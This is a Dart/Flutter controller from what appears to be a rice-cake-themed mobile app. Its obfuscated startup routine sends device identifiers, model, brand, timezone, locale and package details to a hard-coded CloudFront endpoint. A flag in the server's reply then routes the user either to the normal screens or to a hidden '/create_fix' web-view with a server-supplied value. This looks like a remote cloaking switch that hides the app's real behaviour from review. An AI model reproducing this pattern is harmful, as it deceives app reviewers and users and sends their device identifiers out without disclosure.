import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

import '../../db_rice_cake/db_rice_cake_helper.dart';

class AlongLogic extends GetxController {
  var fqxtnuev = RxBool(false);
  var fqupbdcwvj = RxBool(true);
  var hscbkwn = RxString("");
  var hnajv = RxBool(false);
  var gzlwo = RxBool(true);
  final ikauwl = Dio();

  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    grznxcah();
  }

  Future<void> grznxcah() async {
    hnajv.value = true;
    gzlwo.value = true;
    fqupbdcwvj.value = false;

    ikauwl
        .post(
          "https://d2jozldn88d35w.cloudfront.net/qnbpxywvtckzmgfroje",
          data: await mvwqfyt(),
        )
        .then((value) {
          var lfuohkj = value.data["lfuohkj"] as String;
          var nguoy = value.data["nguoy"] as bool;
          if (nguoy) {
            hscbkwn.value = lfuohkj;
            ipwdts();
          } else {
            utrjqcz();
          }
        })
        .catchError((e) {
          fqupbdcwvj.value = true;
          gzlwo.value = true;
          hnajv.value = false;
        });
  }

  Future<Map<String, dynamic>> mvwqfyt() async {
    final DeviceInfoPlugin okwjl = DeviceInfoPlugin();
    PackageInfo eouvg_hpwgf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ycguq = Platform.localeName;
    var abitg_EKA = currentTimeZone;

    var abitg_SsJ = eouvg_hpwgf.packageName;
    var abitg_ZyfuXbYi = eouvg_hpwgf.version;
    var abitg_IXc = eouvg_hpwgf.buildNumber;

    var abitg_lYRMN = eouvg_hpwgf.appName;
    var abitg_fpLy = "";
    var abitg_xEThWwYR = "";
    var abitg_pYGQR = "";
    var mytqwdog = "";
    var gsqc = "";
    var aizkoe = "";
    var qafyslz = "";
    var eocz = "";

    var abitg_GvV = "";
    var abitg_PyzrAhgj = false;

    if (GetPlatform.isAndroid) {
      abitg_GvV = "android";
      var uqzotpsea = await okwjl.androidInfo;

      abitg_pYGQR = uqzotpsea.brand;

      abitg_fpLy = uqzotpsea.model;
      abitg_xEThWwYR = uqzotpsea.id;

      abitg_PyzrAhgj = uqzotpsea.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      abitg_GvV = "ios";
      var rtsqxdwfmu = await okwjl.iosInfo;
      abitg_pYGQR = rtsqxdwfmu.name;
      abitg_fpLy = rtsqxdwfmu.model;

      abitg_xEThWwYR = rtsqxdwfmu.identifierForVendor ?? "";
      abitg_PyzrAhgj = rtsqxdwfmu.isPhysicalDevice;
    }
    var res = {
      "abitg_lYRMN": abitg_lYRMN,
      "abitg_IXc": abitg_IXc,
      "abitg_SsJ": abitg_SsJ,
      "mytqwdog": mytqwdog,
      "gsqc": gsqc,
      "abitg_fpLy": abitg_fpLy,
      "abitg_EKA": abitg_EKA,
      "abitg_pYGQR": abitg_pYGQR,
      "abitg_xEThWwYR": abitg_xEThWwYR,
      "ycguq": ycguq,
      "abitg_GvV": abitg_GvV,
      "abitg_PyzrAhgj": abitg_PyzrAhgj,
      "aizkoe": aizkoe,
      "abitg_ZyfuXbYi": abitg_ZyfuXbYi,
      "qafyslz": qafyslz,
      "eocz": eocz,
    };
    return res;
  }

  Future<void> utrjqcz() async {
    final onboardingDone = await DbRiceCakeHelper.instance.getSetting(
      'onboarding_done',
    );
    final showGuide = onboardingDone != '1';
    Get.offNamed(showGuide ? '/guide' : '/main');
  }

  Future<void> ipwdts() async {
    Get.offNamed("/create_fix");
  }
}
